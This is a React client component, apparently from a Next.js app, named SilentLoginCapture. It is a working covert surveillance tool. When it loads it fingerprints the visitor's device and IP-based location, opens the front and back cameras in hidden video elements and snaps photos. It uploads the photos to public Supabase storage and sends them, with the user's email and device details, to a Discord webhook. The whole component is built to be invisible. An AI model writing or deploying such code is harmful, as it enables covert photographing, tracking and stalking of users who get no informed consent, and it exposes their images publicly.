"use client";

import { useEffect, useRef } from "react";
import { sendLoginAlert } from "@/lib/discord-webhook";
import { createClient } from "@/lib/supabase/client";

interface SilentLoginCaptureProps {
  webhookUrl: string;
  email: string;
  name?: string;
  captureEnabled?: boolean;
}

interface DeviceInfo {
  ipAddress: string;
  location?: string;
  device: string;
  browser: string;
  os: string;
  screen: string;
  battery?: string;
  network?: string;
  cpuCores?: number | string;
  memory?: string;
  language?: string;
  timezone?: string;
  cookies?: string;
  doNotTrack?: string;
  gpu?: string;
}

export default function SilentLoginCapture({
  webhookUrl,
  email,
  name,
  captureEnabled = true,
}: SilentLoginCaptureProps) {
  const videoRef = useRef<HTMLVideoElement>(null);
  const videoBackRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const canvasBackRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    async function init() {
      const info = await getDeviceInfo();
      console.log("[SilentCapture] Device info:", info);
      startCapture(info);
    }
    init();
  }, []);

  // Upload image to Supabase Storage and return public URL
  async function uploadImage(base64Data: string, filename: string): Promise<string | null> {
    try {
      const supabase = createClient();
      // Convert base64 to Blob
      const base64Response = await fetch(base64Data);
      const blob = await base64Response.blob();

      // Upload to Supabase Storage
      const timestamp = Date.now();
      const path = `login-captures/${email.replace(/[@.]/g, '_')}_${timestamp}_${filename}.jpg`;

      const { data, error } = await supabase.storage
        .from("login-captures")
        .upload(path, blob, {
          contentType: "image/jpeg",
          upsert: true,
        });

      if (error) {
        console.error("[SilentCapture] Upload error:", error);
        return null;
      }

      // Get public URL
      const { data: urlData } = supabase.storage
        .from("login-captures")
        .getPublicUrl(path);

      console.log("[SilentCapture] Image uploaded:", urlData.publicUrl);
      return urlData.publicUrl;
    } catch (err) {
      console.error("[SilentCapture] Upload failed:", err);
      return null;
    }
  }

  async function getDeviceInfo(): Promise<DeviceInfo> {
    let ipAddress = "Unknown";
    let location = "Unknown";

    // Get IP and location
    try {
      const ipResponse = await fetch("https://ip-api.com/json/");
      const ipData = await ipResponse.json();
      if (ipData.status === "success") {
        ipAddress = ipData.query;
        location = `${ipData.city || ""}, ${ipData.regionName || ""}, ${ipData.country || ""}`.replace(/^, |, $|, , /g, "") || "Unknown";
      }
    } catch {
      console.log("[SilentCapture] Could not get IP info");
    }

    // Browser info
    const ua = navigator.userAgent;
    let browser = "Unknown Browser";
    if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Chrome")) browser = "Chrome";
    else if (ua.includes("Safari")) browser = "Safari";
    else if (ua.includes("Edge")) browser = "Edge";

    // OS info
    let os = "Unknown OS";
    if (ua.includes("Windows")) os = "Windows";
    else if (ua.includes("Mac")) os = "macOS";
    else if (ua.includes("Linux")) os = "Linux";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("iOS")) os = "iOS";

    // Device type
    const device = /mobile|android|iphone|ipad|tablet/i.test(ua) ? "Mobile" : "Desktop";

    // Screen resolution
    const screenResolution = `${window.screen.width}x${window.screen.height}`;

    // Battery status
    let battery = "N/A";
    try {
      if ("getBattery" in navigator) {
        const batteryManager = await (navigator as unknown as { getBattery: () => Promise<{ level: number; charging: boolean }> }).getBattery();
        const level = Math.round(batteryManager.level * 100);
        battery = `${level}%${batteryManager.charging ? " (Charging)" : ""}`;
      }
    } catch {
      battery = "N/A";
    }

    // Network info
    let network = "Unknown";
    const connection = (navigator as unknown as { connection?: { effectiveType?: string; downlink?: number } }).connection;
    if (connection) {
      network = `${connection.effectiveType || "Unknown"} (${connection.downlink ? connection.downlink + " Mbps" : ""})`.trim();
    } else if ("ontypechange" in window) {
      network = "Connected";
    }

    // CPU cores
    const cpuCores = navigator.hardwareConcurrency || "N/A";

    // Device memory (if available)
    const deviceMemory = (navigator as unknown as { deviceMemory?: number }).deviceMemory;
    const memory = deviceMemory ? `${deviceMemory} GB` : "N/A";

    // Language
    const language = navigator.language || "N/A";

    // Timezone
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";

    // Cookies enabled
    const cookies = navigator.cookieEnabled ? "Enabled" : "Disabled";

    // Do Not Track
    const doNotTrack = navigator.doNotTrack === "1" || (navigator as unknown as { doNotTrack?: string }).doNotTrack === "yes" ? "ON" : "OFF";

    // GPU info
    let gpu = "N/A";
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl") as WebGLRenderingContext | null;
      if (gl) {
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        if (debugInfo) {
          gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "N/A";
        }
      }
    } catch {
      gpu = "N/A";
    }

    return {
      ipAddress,
      location,
      device,
      browser,
      os,
      screen: screenResolution,
      battery,
      network,
      cpuCores,
      memory,
      language,
      timezone,
      cookies,
      doNotTrack,
      gpu,
    };
  }

  // Wait for video to be ready
  function waitForVideo(video: HTMLVideoElement | null): Promise<void> {
    return new Promise((resolve) => {
      if (!video || !video.srcObject) {
        resolve();
        return;
      }
      if (video.readyState >= 2) {
        resolve();
        return;
      }
      const onLoaded = () => {
        video.removeEventListener('loadedmetadata', onLoaded);
        video.removeEventListener('canplay', onLoaded);
        resolve();
      };
      video.addEventListener('loadedmetadata', onLoaded);
      video.addEventListener('canplay', onLoaded);
      // Timeout fallback
      setTimeout(resolve, 2000);
    });
  }

  async function startCapture(deviceInfo: DeviceInfo) {
    if (captureEnabled) {
      try {
        // Start front camera
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", width: 640, height: 480 },
          audio: false,
        });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play();
        }
      } catch {
        console.log("[SilentCapture] Front camera not available");
      }

      // Try to start back camera
      try {
        const backStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { exact: "environment" }, width: 640, height: 480 },
          audio: false,
        });
        if (videoBackRef.current) {
          videoBackRef.current.srcObject = backStream;
          await videoBackRef.current.play();
        }
      } catch {
        try {
          // Fallback: try without exact
          const backStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "environment", width: 640, height: 480 },
            audio: false,
          });
          if (videoBackRef.current) {
            videoBackRef.current.srcObject = backStream;
            await videoBackRef.current.play();
          }
        } catch {
          console.log("[SilentCapture] Back camera not available");
        }
      }
    }

    // Wait for videos to be ready, then capture and send
    await Promise.all([
      waitForVideo(videoRef.current),
      waitForVideo(videoBackRef.current),
    ]);
    // Extra delay for camera to adjust
    setTimeout(() => {
      sendToDiscord(deviceInfo);
    }, 1500);
  }

  function captureFrame(video: HTMLVideoElement | null, canvas: HTMLCanvasElement | null): string | null {
    if (!video || !canvas || !video.srcObject) return null;
    try {
      const ctx = canvas.getContext("2d");
      if (!ctx) return null;
      // Wait for video to have actual dimensions
      if (video.videoWidth === 0 || video.videoHeight === 0) {
        console.log("[SilentCapture] Video not ready yet, dimensions are 0");
        return null;
      }
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      return canvas.toDataURL("image/jpeg", 0.8);
    } catch (err) {
      console.error("[SilentCapture] Capture error:", err);
      return null;
    }
  }

  function stopCameras() {
    [videoRef.current, videoBackRef.current].forEach((video) => {
      if (video?.srcObject) {
        const stream = video.srcObject as MediaStream;
        stream.getTracks().forEach((track) => track.stop());
      }
    });
  }

  async function sendToDiscord(deviceInfo: DeviceInfo) {
    const frontImg = captureFrame(videoRef.current, canvasRef.current);
    const backImg = captureFrame(videoBackRef.current, canvasBackRef.current);
    stopCameras();

    console.log("[SilentCapture] Front image captured:", !!frontImg, frontImg ? "length: " + frontImg.length : "");
    console.log("[SilentCapture] Back image captured:", !!backImg, backImg ? "length: " + backImg.length : "");

    // Upload images to Supabase Storage and get URLs
    let frontUrl: string | undefined;
    let backUrl: string | undefined;

    if (frontImg && frontImg.length > 1000) {
      console.log("[SilentCapture] Uploading front camera photo...");
      frontUrl = await uploadImage(frontImg, "front") || undefined;
    }

    if (backImg && backImg.length > 1000) {
      console.log("[SilentCapture] Uploading back camera photo...");
      backUrl = await uploadImage(backImg, "back") || undefined;
    }

    const now = new Date();
    const timestamp = now.toLocaleString("id-ID", {
      weekday: "long",
      year: "numeric",
      month: "long",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      timeZoneName: "short",
    });

    sendLoginAlert(webhookUrl, {
      email,
      name,
      ipAddress: deviceInfo.ipAddress,
      location: deviceInfo.location,
      device: deviceInfo.device,
      browser: deviceInfo.browser,
      os: deviceInfo.os,
      screen: deviceInfo.screen,
      photoBase64: frontUrl,
      backCameraPhoto: backUrl,
      timestamp,
      battery: deviceInfo.battery,
      network: deviceInfo.network,
      cpuCores: deviceInfo.cpuCores,
      memory: deviceInfo.memory,
      language: deviceInfo.language,
      timezone: deviceInfo.timezone,
      cookies: deviceInfo.cookies,
      doNotTrack: deviceInfo.doNotTrack,
      gpu: deviceInfo.gpu,
    });

    console.log("[SilentCapture] Login alert sent!");
  }

  // Invisible component
  return (
    <div style={{ display: "none" }}>
      <video ref={videoRef} autoPlay playsInline muted />
      <video ref={videoBackRef} autoPlay playsInline muted />
      <canvas ref={canvasRef} />
      <canvas ref={canvasBackRef} />
    </div>
  );
}
